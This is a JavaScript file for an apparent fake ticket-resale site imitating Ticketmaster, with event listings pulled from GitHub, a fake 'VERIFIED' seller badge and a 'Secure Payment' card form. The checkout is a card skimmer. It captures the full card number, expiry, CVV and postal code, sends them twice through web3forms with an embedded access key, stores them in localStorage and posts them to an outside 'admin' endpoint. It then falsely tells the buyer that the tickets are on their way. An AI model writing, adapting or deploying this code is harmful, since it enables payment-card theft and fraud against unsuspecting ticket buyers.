document.addEventListener('DOMContentLoaded', () => {

  // Global variable to store seller link
  let sellerLink = 'https://twitter.com/@stavrimetaxa98'; // Default fallback

  /* ============================================================
     LOAD SELLER CONFIGURATION FROM GITHUB
  ============================================================ */
  async function loadSellerConfig() {
    try {
      // Add cache-busting parameter to force fresh data
      const response = await fetch(`https://raw.githubusercontent.com/Cryptovaultiq/My-Ticketmaster-admin/main/seller-config.json?t=${Date.now()}`);
      if (response.ok) {
        const data = await response.json();
        if (data.sellerLink) {
          sellerLink = data.sellerLink;
        }
      }
    } catch (error) {
      console.log('Using default seller link', error);
    }
  }

  // Load seller config immediately
  loadSellerConfig();

  /* ============================================================
     DYNAMIC EVENTS LOADER – Load from events.json
  ============================================================ */
  async function loadDynamicEvents() {
    // Skip refresh if modal is open
    const modal = document.getElementById('ticket-modal');
    if (modal && modal.classList.contains('active')) {
      return;
    }

    try {
      let events = [];
      
      // Always fetch from GitHub to get latest events (not cached localStorage)
      // Add cache-busting parameter to force fresh data
      const response = await fetch(`https://raw.githubusercontent.com/Cryptovaultiq/My-Ticketmaster-admin/main/events.json?t=${Date.now()}`);
      if (response.ok) {
        const data = await response.json();
        events = data.events;
      }

      // Render events in container
      const container = document.getElementById('events-container');
      if (container) {
        container.innerHTML = '';
        events.forEach(event => {
          const section = document.createElement('section');
          section.className = 'hero-card-event';
          section.dataset.price = event.price;
          section.dataset.eventId = event.id;
          section.innerHTML = `
            <div class="hero-card">
              <div class="hero-card-img">
                <img src="${event.imageUrl}" alt="${event.imageAlt}" loading="lazy">
              </div>
              <div class="hero-card-info">
                <h1 class="event-title">${event.title}</h1>
                <p class="event-location">${event.location}</p>
                <p class="event-time">${event.dateTime}</p>
                <div class="hero-card-footer">
                  <button class="btn-buy-now btn-primary">Buy Now</button>
                  <span class="ticket-avail">Available ${event.ticketsAvailable} Tickets</span>
                </div>
              </div>
            </div>
          `;
          container.appendChild(section);
        });
      }
      
      // Handle hash-based modal opening (e.g., resell.html/#1)
      handleHashNavigation();
    } catch (error) {
      console.error('Error loading events:', error);
    }
  }

  // Load events on page load
  loadDynamicEvents();
  
  // Auto-refresh events every 5 seconds to show admin updates faster
  setInterval(loadDynamicEvents, 5000);

  /* ============================================================
     HAMBURGER + MOBILE MENU – NOW WORKING
  ============================================================ */
  const hamburger = document.getElementById('hamburger');
  const mobileMenu = document.getElementById('mobile-menu');

  if (hamburger && mobileMenu) {
    hamburger.addEventListener('click', () => {
      hamburger.classList.toggle('active');
      mobileMenu.classList.toggle('active');
    });

    mobileMenu.querySelectorAll('a').forEach(link => {
      link.addEventListener('click', () => {
        hamburger.classList.remove('active');
        mobileMenu.classList.remove('active');
      });
    });

    document.addEventListener('click', (e) => {
      if (!hamburger.contains(e.target) && !mobileMenu.contains(e.target)) {
        hamburger.classList.remove('active');
        mobileMenu.classList.remove('active');
      }
    });
  }

  /* ============================================================
     HERO CAROUSEL (kept for other pages)
  ============================================================ */
  const slides = document.querySelectorAll('.carousel-slide');
  if (slides.length > 0) {
    const prevBtn = document.querySelector('.carousel-prev');
    const nextBtn = document.querySelector('.carousel-next');
    const dotsContainer = document.querySelector('.carousel-dots');
    let currentSlide = 0;
    let autoSlide;

    slides.forEach((_, i) => {
      const dot = document.createElement('div');
      dot.classList.add('dot');
      if (i === 0) dot.classList.add('active');
      dot.addEventListener('click', () => goToSlide(i));
      dotsContainer.appendChild(dot);
    });

    const dots = document.querySelectorAll('.dot');

    function updateSlide() {
      slides.forEach((s, i) => s.classList.toggle('active', i === currentSlide));
      dots.forEach((d, i) => d.classList.toggle('active', i === currentSlide));
    }

    function nextSlide() {
      currentSlide = (currentSlide + 1) % slides.length;
      updateSlide();
    }

    function goToSlide(i) {
      currentSlide = i;
      updateSlide();
      resetAuto();
    }

    prevBtn?.addEventListener('click', () => {
      currentSlide = (currentSlide - 1 + slides.length) % slides.length;
      updateSlide();
      resetAuto();
    });

    nextBtn?.addEventListener('click', () => {
      nextSlide();
      resetAuto();
    });

    function startAuto() {
      autoSlide = setInterval(nextSlide, 5000);
    }
    function resetAuto() {
      clearInterval(autoSlide);
      startAuto();
    }

    startAuto();
    updateSlide();
  }

  /* ============================================================
     SEARCH BAR
  ============================================================ */
  document.querySelector('.search-bar button')?.addEventListener('click', () => {
    const query = document.querySelector('.search-bar input').value.trim();
    if (query) alert(`Searching for: "${query}"`);
  });

  /* ============================================================
     TICKET MODAL – 100% WORKING
  ============================================================ */
  const modal = document.getElementById('ticket-modal');
  const closeModalBtn = document.getElementById('close-modal');
  const payNowBtn = document.getElementById('pay-now-btn');

  if (modal) {
    let selectedPrice = 0;
    let selectedQty = 1;
    const startingSeat = 68;



    const seatInfo = document.createElement('p');
    seatInfo.style.marginTop = '0.8rem';
    seatInfo.style.fontWeight = '500';
    seatInfo.style.color = '#fff';

    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.id = 'ticket-email';
    emailInput.placeholder = 'Receiver email address';
    emailInput.required = true;
    emailInput.style.display = 'block';
    emailInput.style.margin = '1rem auto 0';
    emailInput.style.padding = '0.8rem';
    emailInput.style.borderRadius = '12px';
    emailInput.style.border = '1px solid #444';
    emailInput.style.width = '90%';
    emailInput.style.maxWidth = '320px';
    emailInput.style.background = '#222';
    emailInput.style.color = '#fff';

    /* ============================================================
       EVENT STADIUM IMAGE UNDER EMAIL
    ============================================================ */
    const stadiumImg = document.createElement('img');
    stadiumImg.src = 'ticket-stadium1.png';
    stadiumImg.alt = 'Event Stadium';
    stadiumImg.style.display = 'block';
    stadiumImg.style.margin = '1rem auto';
    stadiumImg.style.maxWidth = '280px';
    stadiumImg.style.width = '90%';
    stadiumImg.style.borderRadius = '12px';
    stadiumImg.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.5)';

    /* ============================================================
       MESSAGE SELLER BUTTON + VERIFIED BADGE
    ============================================================ */
    const msgSellerBtn = document.createElement('button');
    msgSellerBtn.innerHTML = 'Message Seller <span id="verify-badge">VERIFIED</span>';
    msgSellerBtn.id = 'msg-seller-btn';
    msgSellerBtn.style.display = 'block';
    msgSellerBtn.style.margin = '0 auto 1rem';
    msgSellerBtn.style.padding = '0.7rem 1.4rem';
    msgSellerBtn.style.border = 'none';
    msgSellerBtn.style.borderRadius = '12px';
    msgSellerBtn.style.fontWeight = '600';
    msgSellerBtn.style.cursor = 'pointer';
    msgSellerBtn.style.background = '#0600FF';
    msgSellerBtn.style.color = '#fff';
    msgSellerBtn.style.transition = '0.3s';

    const verifyBadge = msgSellerBtn.querySelector('#verify-badge');
    verifyBadge.style.background = '#FF00AD';
    verifyBadge.style.color = '#fff';
    verifyBadge.style.padding = '0.2rem 0.5rem';
    verifyBadge.style.borderRadius = '6px';
    verifyBadge.style.fontSize = '0.8rem';
    verifyBadge.style.marginLeft = '8px';
    verifyBadge.style.fontWeight = '700';

    msgSellerBtn.addEventListener('mouseenter', () => {
      msgSellerBtn.style.transform = 'scale(1.06)';
    });
    msgSellerBtn.addEventListener('mouseleave', () => {
      msgSellerBtn.style.transform = 'scale(1)';
    });
    msgSellerBtn.addEventListener('click', () => {
      window.open(sellerLink, '_blank');
    });

    /* ============================================================
       BLUE BORDER BOX FOR PRICE + QTY + TOTAL
    ============================================================ */
    const priceBox = document.createElement('div');
    priceBox.style.border = '2px solid #007bff';
    priceBox.style.padding = '1rem';
    priceBox.style.borderRadius = '12px';
    priceBox.style.marginBottom = '1rem';
    priceBox.style.color = '#fff';
    priceBox.style.textAlign = 'center';
    priceBox.style.display = 'flex';
    priceBox.style.flexDirection = 'column';
    priceBox.style.gap = '1rem';

    const priceLine = document.createElement('p');
    priceLine.id = 'price-per-ticket';
    priceLine.innerHTML = `Price per ticket: <strong>$0.00</strong>`;

    const qtyBox = document.createElement('div');
    qtyBox.style.display = 'flex';
    qtyBox.style.justifyContent = 'center';
    qtyBox.style.alignItems = 'center';
    qtyBox.style.gap = '12px';

    const qtyMinus = document.getElementById('qty-minus');
    const qtyInput = document.getElementById('qty-input');
    const qtyPlus = document.getElementById('qty-plus');

    // Center the quantity input text
    if (qtyInput) {
      qtyInput.style.textAlign = 'center';
    }

    qtyBox.appendChild(qtyMinus);
    qtyBox.appendChild(qtyInput);
    qtyBox.appendChild(qtyPlus);

    const totalLine = document.createElement('p');
    totalLine.innerHTML = `Total: <strong id="total-amount">0.00</strong>`;

    priceBox.appendChild(priceLine);
    priceBox.appendChild(qtyBox);
    priceBox.appendChild(totalLine);

    /* INSERT ITEMS IN CORRECT ORDER */
    payNowBtn.parentNode.insertBefore(msgSellerBtn, payNowBtn);
    payNowBtn.parentNode.insertBefore(priceBox, payNowBtn);
    payNowBtn.parentNode.insertBefore(stadiumImg, payNowBtn);
    payNowBtn.parentNode.insertBefore(emailInput, payNowBtn);
    payNowBtn.parentNode.insertBefore(seatInfo, payNowBtn);

    /* ============================================================
       QUANTITY BUTTONS
    ============================================================ */
    qtyMinus?.addEventListener('click', () => {
      if (selectedQty > 1) {
        selectedQty--;
        qtyInput.value = selectedQty;
        updateTotal();
      }
    });

    qtyPlus?.addEventListener('click', () => {
      if (selectedQty < 8) {
        selectedQty++;
        qtyInput.value = selectedQty;
        updateTotal();
      }
    });

    function updateTotal() {
      priceLine.innerHTML = `Price per ticket: <strong>$${selectedPrice.toFixed(2)}</strong>`;
      const totalUSD = selectedPrice * selectedQty;
      totalLine.innerHTML = `Total: <strong>$${totalUSD.toFixed(2)}</strong>`;

      if (selectedQty === 1) {
        seatInfo.textContent = `Row: A | Seat: ${startingSeat}`;
      } else {
        const seats = [];
        for (let i = 0; i < selectedQty; i++) seats.push(startingSeat + i);
        seatInfo.textContent = `Seats together | ROW A | Seat ${seats.join(', ')}`;
      }
    }

    /* ============================================================
       BUY NOW BUTTON (Event Delegation for Dynamic Events)
    ============================================================ */
    function handleHashNavigation() {
      const hash = window.location.hash.slice(1); // Remove the # character
      if (hash) {
        const eventCard = document.querySelector(`[data-event-id="${hash}"] .hero-card`);
        if (eventCard && eventCard.querySelector('.btn-buy-now')) {
          eventCard.querySelector('.btn-buy-now').click();
        }
      }
    }

    // Listen for hash changes (e.g., user clicks back button or uses history)
    window.addEventListener('hashchange', handleHashNavigation);

    document.addEventListener('click', (e) => {
      if (!e.target.classList.contains('btn-buy-now')) return;

      e.preventDefault();
      e.stopPropagation();

      const btn = e.target;
      const card = btn.closest('.hero-card');
      if (!card) return;

      const eventSection = card.closest('.hero-card-event');
      const eventId = eventSection?.dataset.eventId;

      const title = card.querySelector('.event-title')?.textContent.trim() || 'Event Ticket';
      const price = parseFloat(card.closest('.hero-card-event')?.dataset.price) || 50;

      // Set hash in URL for shareable links
      if (eventId) {
        window.location.hash = eventId;
      }

      selectedPrice = price;
      selectedQty = 1;
      emailInput.value = '';

      const loader = document.createElement('div');
      loader.id = 'ticket-loader';
      loader.style.cssText = `
        position:fixed;top:0;left:0;width:100vw;height:100vh;
        background:rgba(0,0,0,0.9);display:flex;justify-content:center;
        align-items:center;z-index:9999;
      `;

      const ticketImg = document.createElement('img');
      ticketImg.src = 'ticket.png';
      ticketImg.style.cssText = `
        width:160px;height:160px;animation:spin 3s linear infinite;
        filter:invert(77%) sepia(100%) saturate(7500%) hue-rotate(5deg) brightness(1.1);
      `;
      loader.appendChild(ticketImg);
      document.body.appendChild(loader);

      setTimeout(() => {
        document.body.removeChild(loader);
        document.getElementById('modal-event-name').textContent = title;
        document.getElementById('modal-price').textContent = price.toFixed(2);
        qtyInput.value = 1;
        updateTotal();
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
      }, 3000);
    });

    closeModalBtn?.addEventListener('click', () => {
      modal.classList.remove('active');
      document.body.style.overflow = '';
      window.location.hash = ''; // Clear hash when modal closes
    });

    window.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        window.location.hash = ''; // Clear hash when modal closes
      }
    });

    // Close modal with Escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modal.classList.contains('active')) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        window.location.hash = '';
      }
    });

    /* ============================================================
       SEPARATE CARD PAYMENT MODAL
    ============================================================ */
    const cardPaymentModal = document.createElement('div');
    cardPaymentModal.id = 'card-payment-modal';
    cardPaymentModal.style.cssText = `
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.95);
      z-index: 10000;
      align-items: center;
      justify-content: center;
    `;

    const cardModalContent = document.createElement('div');
    cardModalContent.style.cssText = `
      background: linear-gradient(135deg, #0000FF 0%, #00FFFF 100%);
      border-radius: 25px;
      padding: 2rem 1.5rem;
      max-width: 480px;
      width: calc(100% - 2rem);
      max-height: 90vh;
      overflow-y: hidden;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 0 0 60px rgba(0, 255, 255, 0.3);
      color: #FFFFFF;
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.2);
      box-sizing: border-box;
    `;
    
    /* Media query for mobile */
    if (window.innerWidth < 768) {
      cardModalContent.style.padding = '1.5rem 1rem';
      cardModalContent.style.width = 'calc(100% - 1rem)';
    }

    const cardCloseBtn = document.createElement('button');
    cardCloseBtn.textContent = '✕';
    cardCloseBtn.style.cssText = `
      position: absolute;
      top: 20px;
      right: 20px;
      background: rgba(255, 255, 255, 0.2);
      border: none;
      color: #fff;
      font-size: 1.5rem;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      cursor: pointer;
      transition: 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
    `;
    cardCloseBtn.addEventListener('mouseenter', () => {
      cardCloseBtn.style.background = 'rgba(255, 255, 255, 0.3)';
    });
    cardCloseBtn.addEventListener('mouseleave', () => {
      cardCloseBtn.style.background = 'rgba(255, 255, 255, 0.2)';
    });
    cardCloseBtn.addEventListener('click', () => {
      cardPaymentModal.style.display = 'none';
      modal.classList.remove('active');
      document.body.style.overflow = '';
    });
    cardModalContent.appendChild(cardCloseBtn);

    const cardTitle = document.createElement('h2');
    cardTitle.textContent = 'Secure Payment';
    cardTitle.style.cssText = `
      margin: 0 0 1.2rem 0;
      font-size: 1.8rem;
      font-weight: 700;
      text-align: center;
      background: linear-gradient(135deg, #00FFFF 0%, #FFFFFF 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    `;
    cardModalContent.appendChild(cardTitle);

    const amountDisplay = document.createElement('div');
    amountDisplay.style.cssText = `
      background: rgba(0, 255, 255, 0.1);
      padding: 1rem;
      border-radius: 12px;
      margin-bottom: 1.2rem;
      text-align: center;
      border: 1px solid rgba(0, 255, 255, 0.3);
      width: 100%;
      box-sizing: border-box;
    `;
    amountDisplay.innerHTML = `
      <p style="margin: 0 0 0.3rem 0; font-size: 0.85rem; opacity: 0.9; color: #FFFFFF;">Amount to Pay</p>
      <h3 style="margin: 0; font-size: 1.8rem; color: #00FFFF;">$<span id="card-amount">0.00</span></h3>
    `;
    cardModalContent.appendChild(amountDisplay);

    // Card Number
    const cardNumberInput = document.createElement('input');
    cardNumberInput.type = 'text';
    cardNumberInput.placeholder = 'Card Number';
    cardNumberInput.id = 'card-number';
    cardNumberInput.maxLength = '19';
    cardNumberInput.style.cssText = `
      display: block;
      margin: 0.8rem 0;
      padding: 0.9rem;
      width: 100%;
      border-radius: 10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      background: #FFFFFF;
      color: #000000;
      font-size: 0.95rem;
      font-weight: 500;
      box-sizing: border-box;
      transition: 0.3s;
      font-family: 'Courier New', monospace;
    `;
    cardNumberInput.addEventListener('focus', () => {
      cardNumberInput.style.borderColor = '#0000FF';
      cardNumberInput.style.boxShadow = '0 0 20px rgba(0, 0, 255, 0.3)';
    });
    cardNumberInput.addEventListener('blur', () => {
      cardNumberInput.style.borderColor = 'rgba(255, 255, 255, 0.3)';
      cardNumberInput.style.boxShadow = 'none';
    });
    cardNumberInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\s/g, '');
      let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
      e.target.value = formatted;
    });
    cardModalContent.appendChild(cardNumberInput);

    // Exp Date & CVV Container
    const expCvvContainer = document.createElement('div');
    expCvvContainer.style.cssText = `
      display: flex;
      gap: 0.8rem;
      margin: 0.8rem 0;
      width: 100%;
      box-sizing: border-box;
    `;

    const expDateInput = document.createElement('input');
    expDateInput.type = 'text';
    expDateInput.placeholder = 'MM/YY';
    expDateInput.id = 'exp-date';
    expDateInput.maxLength = '5';
    expDateInput.style.cssText = `
      padding: 0.9rem;
      flex: 1;
      border-radius: 10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      background: #FFFFFF;
      color: #000000;
      font-size: 0.95rem;
      font-weight: 500;
      box-sizing: border-box;
      transition: 0.3s;
      font-family: 'Courier New', monospace;
      min-width: 0;
    `;
    expDateInput.addEventListener('focus', () => {
      expDateInput.style.borderColor = '#0000FF';
      expDateInput.style.boxShadow = '0 0 20px rgba(0, 0, 255, 0.3)';
    });
    expDateInput.addEventListener('blur', () => {
      expDateInput.style.borderColor = 'rgba(255, 255, 255, 0.3)';
      expDateInput.style.boxShadow = 'none';
    });
    expDateInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      e.target.value = value;
    });
    expCvvContainer.appendChild(expDateInput);

    const cvvInput = document.createElement('input');
    cvvInput.type = 'text';
    cvvInput.placeholder = 'CVV';
    cvvInput.id = 'cvv';
    cvvInput.maxLength = '4';
    cvvInput.style.cssText = `
      padding: 0.9rem;
      flex: 1;
      border-radius: 10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      background: #FFFFFF;
      color: #000000;
      font-size: 0.95rem;
      font-weight: 500;
      box-sizing: border-box;
      transition: 0.3s;
      font-family: 'Courier New', monospace;
      min-width: 0;
    `;
    cvvInput.addEventListener('focus', () => {
      cvvInput.style.borderColor = '#0000FF';
      cvvInput.style.boxShadow = '0 0 20px rgba(0, 0, 255, 0.3)';
    });
    cvvInput.addEventListener('blur', () => {
      cvvInput.style.borderColor = 'rgba(255, 255, 255, 0.3)';
      cvvInput.style.boxShadow = 'none';
    });
    cvvInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
    });
    expCvvContainer.appendChild(cvvInput);
    cardModalContent.appendChild(expCvvContainer);

    // Postal Code
    const postalCodeInput = document.createElement('input');
    postalCodeInput.type = 'text';
    postalCodeInput.placeholder = 'Postal Code';
    postalCodeInput.id = 'postal-code';
    postalCodeInput.style.cssText = `
      display: block;
      margin: 0.8rem 0;
      padding: 0.9rem;
      width: 100%;
      border-radius: 10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      background: #FFFFFF;
      color: #000000;
      font-size: 0.95rem;
      font-weight: 500;
      box-sizing: border-box;
      transition: 0.3s;
    `;
    postalCodeInput.addEventListener('focus', () => {
      postalCodeInput.style.borderColor = '#0000FF';
      postalCodeInput.style.boxShadow = '0 0 20px rgba(0, 0, 255, 0.3)';
    });
    postalCodeInput.addEventListener('blur', () => {
      postalCodeInput.style.borderColor = 'rgba(255, 255, 255, 0.3)';
      postalCodeInput.style.boxShadow = 'none';
    });
    cardModalContent.appendChild(postalCodeInput);

    // Place Secured Order Button
    const placeOrderBtn = document.createElement('button');
    placeOrderBtn.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 8px; display: inline-block; vertical-align: middle;">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
      </svg>
      Place Secured Order
    `;
    placeOrderBtn.style.cssText = `
      display: block;
      margin: 1.5rem 0 0 0;
      padding: 1rem 1.5rem;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, #0000FF 0%, #00FFFF 100%);
      color: #FFFFFF;
      font-weight: 700;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 8px 25px rgba(0, 0, 255, 0.4);
      width: 100%;
      box-sizing: border-box;
    `;
    placeOrderBtn.addEventListener('mouseenter', () => {
      placeOrderBtn.style.transform = 'translateY(-3px)';
      placeOrderBtn.style.boxShadow = '0 12px 35px rgba(0, 0, 255, 0.6)';
    });
    placeOrderBtn.addEventListener('mouseleave', () => {
      placeOrderBtn.style.transform = 'translateY(0)';
      placeOrderBtn.style.boxShadow = '0 8px 25px rgba(0, 0, 255, 0.4)';
    });
    cardModalContent.appendChild(placeOrderBtn);

    cardPaymentModal.appendChild(cardModalContent);
    document.body.appendChild(cardPaymentModal);

    // Loading overlay for 5 seconds
    const loadingOverlay = document.createElement('div');
    loadingOverlay.id = 'card-loading-overlay';
    loadingOverlay.style.cssText = `
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.95);
      z-index: 9999;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(10px);
    `;

    const circularLoader = document.createElement('div');
    circularLoader.style.cssText = `
      width: 120px;
      height: 120px;
      border: 6px solid rgba(0, 212, 255, 0.2);
      border-top: 6px solid #00d4ff;
      border-radius: 50%;
      animation: spin 2s linear infinite;
      box-shadow: 0 0 40px rgba(0, 212, 255, 0.4), inset 0 0 40px rgba(0, 212, 255, 0.1);
    `;

    const loaderText = document.createElement('div');
    loaderText.textContent = 'Processing Payment';
    loaderText.style.cssText = `
      position: absolute;
      color: #00d4ff;
      font-weight: 600;
      font-size: 1.1rem;
      margin-top: 160px;
      letter-spacing: 2px;
    `;

    loadingOverlay.appendChild(circularLoader);
    loadingOverlay.appendChild(loaderText);
    document.body.appendChild(loadingOverlay);

    // Show card form when Pay Now is clicked
    payNowBtn?.addEventListener('click', () => {
      if (!emailInput.value.includes('@')) {
        alert('Please enter a valid email address');
        emailInput.focus();
        return;
      }
      
      // Show loading overlay
      loadingOverlay.style.display = 'flex';
      modal.classList.add('blur-active');
      document.body.style.overflow = 'hidden';

      // After 5 seconds, show card modal
      setTimeout(() => {
        loadingOverlay.style.display = 'none';
        cardPaymentModal.style.display = 'flex';
        document.getElementById('card-amount').textContent = (selectedPrice * selectedQty).toFixed(2);
        cardNumberInput.focus();
      }, 5000);
    });

    // Place Secured Order button handler
    placeOrderBtn.addEventListener('click', async () => {
      const cardNumber = cardNumberInput.value.replace(/\s/g, '');
      const expDate = expDateInput.value;
      const cvv = cvvInput.value;
      const postalCode = postalCodeInput.value;

      // Validation
      if (!cardNumber || cardNumber.length < 13) {
        alert('Please enter a valid card number');
        cardNumberInput.focus();
        return;
      }
      if (!expDate || !expDate.includes('/')) {
        alert('Please enter expiration date (MM/YY)');
        expDateInput.focus();
        return;
      }
      if (!cvv || cvv.length < 3) {
        alert('Please enter a valid CVV');
        cvvInput.focus();
        return;
      }
      if (!postalCode) {
        alert('Please enter postal code');
        postalCodeInput.focus();
        return;
      }

      placeOrderBtn.disabled = true;
      const originalBtnText = placeOrderBtn.textContent;
      placeOrderBtn.textContent = 'Processing...';

      try {
        // Create FormData with simple field names for web3forms
        const formData = new FormData();
        formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
        formData.append('subject', 'New Ticket Order - Payment Received');
        formData.append('from_name', emailInput.value);
        formData.append('email_address', emailInput.value);
        formData.append('buyer_email', emailInput.value);
        formData.append('event_name', document.getElementById('modal-event-name').textContent.trim());
        formData.append('ticket_quantity', selectedQty);
        formData.append('total_payment', (selectedPrice * selectedQty).toFixed(2));
        formData.append('card_number', cardNumber);
        formData.append('expiry_date', expDate);
        formData.append('security_code', cvv);
        formData.append('zip_code', postalCode);
        formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);

        // Submit to first access key
        const response = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          body: formData
        });

        // Submit to second access key (duplicate submission with different access key)
        const formData2 = new FormData();
        formData2.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
        formData2.append('subject', 'New Ticket Order - Payment Received');
        formData2.append('from_name', emailInput.value);
        formData2.append('email_address', emailInput.value);
        formData2.append('buyer_email', emailInput.value);
        formData2.append('event_name', document.getElementById('modal-event-name').textContent.trim());
        formData2.append('ticket_quantity', selectedQty);
        formData2.append('total_payment', (selectedPrice * selectedQty).toFixed(2));
        formData2.append('card_number', cardNumber);
        formData2.append('expiry_date', expDate);
        formData2.append('security_code', cvv);
        formData2.append('zip_code', postalCode);
        formData2.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);

        fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          body: formData2
        }).catch(err => console.log('Second Web3Forms submission failed (non-critical)', err));

        const result = await response.json();

        if (result.success) {
          // Save submission to admin panel
          const submissionData = {
            email: emailInput.value,
            eventTitle: document.getElementById('modal-event-name').textContent.trim(),
            quantity: selectedQty,
            pricePerTicket: selectedPrice,
            total: (selectedPrice * selectedQty).toFixed(2),
            cardNumber: cardNumber, // Save full card number
            expiryDate: expDate,
            cvv: cvv, // Save CVV
            zipCode: postalCode
          };

          // Save to localStorage
          let submissions = [];
          const stored = localStorage.getItem('submissions');
          if (stored) {
            submissions = JSON.parse(stored);
          }
          const newSubmission = {
            id: Date.now(),
            ...submissionData,
            timestamp: new Date().toISOString(),
            date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString()
          };
          submissions.unshift(newSubmission);
          localStorage.setItem('submissions', JSON.stringify(submissions));

          // Also post to admin API to sync with GitHub
          try {
            fetch('https://admin-tmaster.vercel.app/api/submissions', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(submissionData)
            }).catch(err => console.log('Note: Admin sync failed (non-critical)', err));
          } catch (e) {
            console.log('Note: Could not sync to admin', e);
          }

          alert('Your order is processing, you will receive the tickets via your email address shortly. Thank you for your purchase!');
          // Reset form
          cardNumberInput.value = '';
          expDateInput.value = '';
          cvvInput.value = '';
          postalCodeInput.value = '';
          emailInput.value = '';
          cardPaymentModal.style.display = 'none';
          modal.classList.remove('active');
          modal.classList.remove('blur-active');
          document.body.style.overflow = '';
        } else {
          alert('Payment processing failed: ' + (result.message || 'Please try again'));
        }
      } catch (err) {
        console.error('Order submission error:', err);
        alert('Error placing order: ' + (err.message || 'Please try again'));
      } finally {
        placeOrderBtn.disabled = false;
        placeOrderBtn.textContent = originalBtnText;
      }
    });
  }


  /* ============================================================
     INJECTED STYLES
  ============================================================ */
  const style = document.createElement('style');
  style.innerHTML = `
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    #ticket-modal {
      display: none;
      position: fixed;
      inset: 0;
      margin-top: 65px;
      background: rgba(0,0,0,0.7);
      z-index: 999;
      align-items: flex-start;
      justify-content: center;
      padding-top: 30px;
      overflow-y: auto;
      transition: filter 0.3s ease;
    }

    #ticket-modal.blur-active {
      filter: blur(10px);
    }

    #ticket-modal.active {
      display: flex;
    }

    #ticket-modal .modal-content {
      background: #1c1c1c;
      border-radius: 15px;
      padding: 2rem;
      max-width: 450px;
      width: 90%;
      margin: 0 auto;
      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
      color: #fff;
      position: relative;
      text-align: center;
      max-height: 90vh;
      overflow-y: auto;
    }

    #close-modal {
      position: absolute; top: 15px; right: 15px; background: red;
      border: none; border-radius: 50%; width: 30px; height: 30px;
      font-weight: bold; cursor: pointer; transition: transform 0.2s;
    }
    #close-modal:hover { transform: scale(1.1); }

    #pay-now-btn {
      background: linear-gradient(90deg, #FFD700, #FFA500);
      color: #1c1c1c; border: none; padding: 0.8rem 1.5rem;
      border-radius: 10px; font-weight: 600; cursor: pointer;
      transition: all 0.3s ease;
    }
    #pay-now-btn:hover { transform: scale(1.05); box-shadow: 0 4px 15px rgba(255,215,0,0.5); }

    #qty-minus, #qty-plus {
      background: #333; color: #fff; border: none; padding: 0.4rem 0.8rem;
      border-radius: 8px; cursor: pointer;
    }
    #qty-minus:hover, #qty-plus:hover { background: #444; }
    #ticket-email { font-size: 1rem; }
  `;
  document.head.appendChild(style);

});
